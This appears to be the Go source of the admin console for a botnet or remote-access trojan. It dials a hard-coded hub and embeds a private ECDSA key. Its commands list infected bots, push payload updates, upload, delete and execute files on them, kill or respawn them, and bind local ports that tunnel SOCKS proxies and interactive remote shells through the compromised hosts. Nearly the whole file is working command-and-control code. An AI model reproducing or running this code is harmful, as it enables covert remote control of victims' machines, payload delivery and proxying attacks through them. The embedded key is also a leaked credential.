// go build admin.go share.go
package main

import (
	"bufio"
	"fmt"
	"flag"
	"log"
	"io"
	"net"
	"os"
	"strings"
	"sync"

	"io/ioutil"
	"encoding/base64"

	kit "./lib/toolkit"
	"./lib/base"
)


var hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")
var public_ECDSA, _ = base64.StdEncoding.DecodeString("MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEc8tgqZX82zrd6809YWzJkh4zhvaoCEbkU8yxBW+a9U1L+XgItJGRL33vYecv4lH9ovSNgJiyvnqdmqkJtwq52Q==")
var private_ECDSA, _ = base64.StdEncoding.DecodeString("MHcCAQEEIFABqR2iqeprQ5Mu3236NGFryXU+J8pUlC14ijvhuSBgoAoGCCqGSM49AwEHoUQDQgAEc8tgqZX82zrd6809YWzJkh4zhvaoCEbkU8yxBW+a9U1L+XgItJGRL33vYecv4lH9ovSNgJiyvnqdmqkJtwq52Q==")

var verb = flag.Int("v", 6, "Verbosity")
var huburl = flag.String("t", "cs8425.noip.me:8787", "hub url")

var verbosity int = 2

var admin *base.Auth
var localserver []*loSrv

type loSrv struct {
	ID             string
	Addr           string
	Args           []string
	Admin          *base.Auth
	Lis            net.Listener
}

func main() {
	flag.Parse()
	verbosity = *verb
	if verbosity > 3 {
		std.SetFlags(log.LstdFlags | log.Lmicroseconds)
	}

	admin = base.NewAuth()
	admin.HubPubKey = hubPubKey
	admin.Private_ECDSA = private_ECDSA
	admin.Public_ECDSA = public_ECDSA // not used

	conn, err := net.Dial("tcp", *huburl)
	if err != nil {
		Vln(1, "connect err", err)
		return
	}

	mux, err := admin.InitConn(conn)
	if err != nil {
		Vln(1, "connect err", err)
		return
	}

	// check connection to hub
	go func(){
		for {
			_, err := mux.AcceptStream()
			if err != nil {
				mux.Close()
				Vln(2, "connection to hub reset!!")
				break
			}
		}
	}()

	var wg sync.WaitGroup
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(">")
		text, err := reader.ReadString('\n')
		if err != nil && err != io.EOF {
			Vln(3, "[ReadLine]", err)
			break
		}
		if err == io.EOF {
			break
		}

		wg.Add(1)
		go func (line string, wg *sync.WaitGroup) {
			defer wg.Done()

			cmd := strings.Fields(line)
			found, exit, hasout, out := execute(cmd)
			if found {
				if hasout {
					fmt.Printf("<%v>%v\n", cmd[0], out)
					fmt.Print(">")
				}
			} else {
				fmt.Println("command not found!")
			}
			if exit {
				//break
			}
		}(text, &wg)
	}
	wg.Wait()
}



// exit?, hasout?, what?
//var opFunc map[string](func([]string) (bool, bool, string))
var opFunc = map[string](func([]string) (bool, bool, string)){
	"bye": opBye,
	"exit": opBye,
	"quit": opBye,
	"bot": opBot,
	"local": opLocal,
}

func opBye(args []string) (bool, bool, string) {
	return true, true, "bye~"
}

func opBot(args []string) (exit bool, hasout bool, out string) {
	exit , hasout , out  = false, false, "\n"

	if len(args) < 1 {
		hasout, out = true, `
bot ls [id | addr]
bot pull (all | select)
bot sync $bot_id
bot [kill | reconn | pkill | bg | ddd | zero] $bot_id
bot update $bot_id $payload_path
bot [rm|call] $bot_id $exec`
		return
	}


	switch args[0] {
	case "ls":
		by := "rtt"
		if len(args) >= 2 {
			by = args[1]
		}

		p1, err := admin.GetConn(base.H_ls)
		if err != nil {
			return
		}

		list := base.PeerList{}
		n, err := list.ReadFrom(p1)
		if err != nil {
			return
		}

		var pl []*base.PeerInfo
		switch by {
		case "addr":
			pl = list.GetListByAddr()

		case "time":
			pl = list.GetListByTime()

		case "id":
			pl = list.GetListByID()

		case "rtt":
			fallthrough
		default:
			pl = list.GetListByRTT()
		}
		out += fmt.Sprintf("total=%v\n", n)
		for _, v := range pl {
			out += v.String() + "\n"
		}
		out += fmt.Sprintf("total=%v\n", n)

		return false, true, out

	case "pull":
		hasout, out = true, "err"
		id := args[1]

		p1, err := admin.GetConn2Hub(id, base.H_fetch)
		if err != nil {
			return
		}
		defer p1.Close()

		hasout, out = true, "ok"

	case "sync":
		hasout = true
		id := args[1]

		p1, err := admin.GetConn2Hub(id, base.H_sync)
		if err != nil {
			return
		}
		defer p1.Close()

		info := base.NewInfo()
		n, err := info.ReadFrom(p1)
		if err != nil {
			out = "sync error!"
			return
		}
		Vln(3, "Pull Info:", n, info)

	case "bg":
		fallthrough
	case "ddd":
		fallthrough
	case "zero":
		fallthrough
	case "kill":
		fallthrough
	case "ppkill":
		fallthrough
	case "ppend":
		fallthrough
	case "reconn":
		if len(args) < 2 {
			hasout, out = true, "not enough"
			return
		}
		opcode := map[string]string {
			"reconn": base.B_reconn,
			"kill": base.B_kill,
			"bg":  base.B_dodaemon,
			"ddd":  base.B_apoptosis,
			"zero":  base.B_rebirth,
			"ppkill":  base.B_ppkill,
			"ppend":  base.B_ppend,
		}
		hasout, out = true, "ok...\n"
		_, err := admin.GetConn2Client(args[1], opcode[args[0]])
		if err != nil {
			out = "err...\n"
		}

	case "update":
		if len(args) < 3 {
			hasout, out = true, "not enough"
			return
		}
		hasout, out = true, "ok...\n"

		id := args[1]
		input := args[2]

		p1, err := admin.GetConn2Client(id, base.B_evolution)
		if err != nil {
			out = fmt.Sprintf("[update][err][%v]%v\n", 1, err)
			return
		}
		defer p1.Close()

		fd, err := os.OpenFile(input, os.O_RDONLY, 0400)
		if err != nil {
			out = fmt.Sprintf("[update][err][%v][err]%v\n", 2, err)
			return
		}
		defer fd.Close()

		b, err := ioutil.ReadAll(fd)
		if err != nil {
			out = fmt.Sprintf("[update][err][%v][err]%v\n", 3, err)
			return
		}
		hashb := kit.HashBytes256(b)
		kit.WriteVTagByte(p1, hashb)
		kit.WriteVTagByte(p1, b)

		fmt.Println("[update]", kit.Hex(hashb))
		out = fmt.Sprintf("\n[update][ok][%v]%v\n", id, kit.Hex(hashb))

	case "put":
		if len(args) < 3 {
			hasout, out = true, "not enough"
			return
		}
		hasout, out = true, "ok...\n"

		id := args[1]
		input := args[2]
		output := args[2]
		if len(args) > 4 {
			output = args[3]
		}

		p1, err := admin.GetConn2Client(id, base.B_fs)
		if err != nil {
			out = fmt.Sprintf("[put][err][%v]%v\n", 1, err)
			return
		}
		defer p1.Close()

		kit.WriteTagStr(p1, base.B_push)

		fd, err := os.OpenFile(input, os.O_RDONLY, 0400)
		if err != nil {
			out = fmt.Sprintf("[put][err][%v][err]%v\n", 2, err)
			return
		}
		defer fd.Close()

		kit.WriteVTagByte(p1, []byte(output))
		hashb, err := kit.IOHash(fd, p1)
		if err != nil {
			out = fmt.Sprintf("[put][err][%v][err]%v\n", 3, err)
			return
		}
		fmt.Println("[put]", kit.Hex(hashb))
		out = fmt.Sprintf("\n[put][ok][%v]%v\n", id, kit.Hex(hashb))

	case "call":
		fallthrough
	case "rm":
		if len(args) < 3 {
			hasout, out = true, "not enough"
			return
		}
		hasout, out = true, "ok...\n"

		opcode := map[string]string {
			"rm": base.B_del,
			"call": base.B_call,
		}

		op, ok := opcode[args[0]]
		if !ok {
			out = "op not found...\n"
		}
		id := args[1]
		fp := args[2]

		p1, err := admin.GetConn2Client(id, base.B_fs)
		if err != nil {
			out = "client op not found...\n"
			return
		}
		defer p1.Close()

		kit.WriteTagStr(p1, op)

		kit.WriteVTagByte(p1, []byte(fp))
		ret64, err := kit.ReadVLen(p1)
		if err != nil || ret64 != int64(0) {
			Vln(3, "[err]", args[0], ret64, err)
			return
		}
		Vln(3, "[", args[0], "]", fp, id)

	default:
		hasout, out = true, ""
	}
	return
}

func opLocal(args []string) (exit bool, hasout bool, out string) {
	// local list
	// local bind bot_id bind_addr [socks|http|shell|shellk]
	exit, hasout, out = false, true, `
local ls
local bind $bot_id $bind_addr [socks|http|sh|shk|call] [mode_argv...]
local stop $bind_addr`

	if len(args) < 1 {
		return
	}

	switch args[0] {
	case "ls":
		hasout, out = true, ""
		for i, srv := range localserver {
			out += fmt.Sprintf("[%v][%v]%v\t%v\n", i, srv.Addr, srv.ID, srv.Args)
		}

	case "stop":
		if len(args) < 2 {
			return
		}
		hasout, out = false, ""
		for i, srv := range localserver {
			if args[1] == srv.Addr {
				out += fmt.Sprintf("[local][stop][%v][%v]%v\t%v\n", i, srv.Addr, srv.ID, srv.Args)
				srv.Lis.Close()
				localserver = append(localserver[:i], localserver[i+1:]...)
				hasout = true
				break
			}
		}

	case "bind":
		if len(args) < 3 {
			return
		}

		if len(args) == 3 {
			args = append(args, "socks")
		}

		srv := &loSrv {
			ID: args[1],
			Addr: args[2],
			Args: args[3:],
			Admin: admin,
		}

		go startLocal(srv)

		hasout, out = true, "ok...\n"

	default:
	}
	return
}

func execute(args []string) (bool, bool, bool, string) {
	if len(args) == 0 {
		return true, false, false, ""
	}

	if op := opFunc[args[0]]; op != nil {
		exit, hasout, out := op(args[1:])
		return true, exit, hasout, out
	}

	return false, false, false, ""
}

func startLocal(srv *loSrv) {

	lis, err := net.Listen("tcp", srv.Addr)
	if err != nil {
		Vln(2, "[local]Error listening:", err.Error())
		return
	}
	defer lis.Close()
	srv.Lis = lis
	localserver = append(localserver, srv)

	for {
		if conn, err := lis.Accept(); err == nil {
			Vln(2, "[local][new]", conn.RemoteAddr())

			// TODO: check client still online
			go handleClient(srv.Admin, conn, srv.ID, srv.Args)
		} else {
			Vln(2, "[local]Accept err", err)
			return
		}
	}

}

func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
	defer p0.Close()

	mode := argv[0]
	switch mode {
	case "socks":
		//Vln(2, "socksv5")
		p1, err := admin.GetConn2Client(id, base.B_fast0)
		if err != nil {
			return
		}
		defer p1.Close()

		// do socks5
		base.HandleSocksF(p0, p1)


	case "shk":
		p1, err := admin.GetConn2Client(id, base.B_shk)
		if err != nil {
			return
		}
		defer p1.Close()

		Vln(3, "[got]shellk", p0.RemoteAddr())
		kit.Cp(p0, p1)
		Vln(3, "[cls]shellk", p0.RemoteAddr())

	case "sh":
		p1, err := admin.GetConn2Client(id, base.B_csh)
		if err != nil {
			return
		}
		defer p1.Close()

		shell := []byte("sh")
		if len(argv) > 1 {
			//shell = []byte(strings.Join(argv[1:], " "))
			shell = []byte(argv[1])
			Vln(4, "[sh]bin = ", string(shell))
		}
		kit.WriteVTagByte(p1, shell)

		keep := int64(0)
		if len(argv) > 2 {
			if argv[2] != "0" {
				Vln(4, "[sh]keep = ", true)
				keep = int64(1)
			}
		}
		kit.WriteVLen(p1, keep)

		Vln(3, "[got]sh", p0.RemoteAddr())
		kit.Cp(p0, p1)
		Vln(3, "[cls]sh", p0.RemoteAddr())

	case "call":
		p1, err := admin.GetConn2Client(id, base.B_call)
		if err != nil {
			return
		}
		defer p1.Close()

		if len(argv) < 2 {
			return
		}
		hashid := argv[1]
		kit.WriteVTagByte(p1, []byte(hashid))
		ret64, err := kit.ReadVLen(p1)
		if err != nil || ret64 != int64(0) {
			Vln(3, "[err]call", ret64, hashid, p0.RemoteAddr(), err)
			return
		}

		Vln(3, "[got]call", hashid, p0.RemoteAddr())
		kit.Cp(p0, p1)
		Vln(3, "[cls]call", hashid, p0.RemoteAddr())

	default:
	}
}

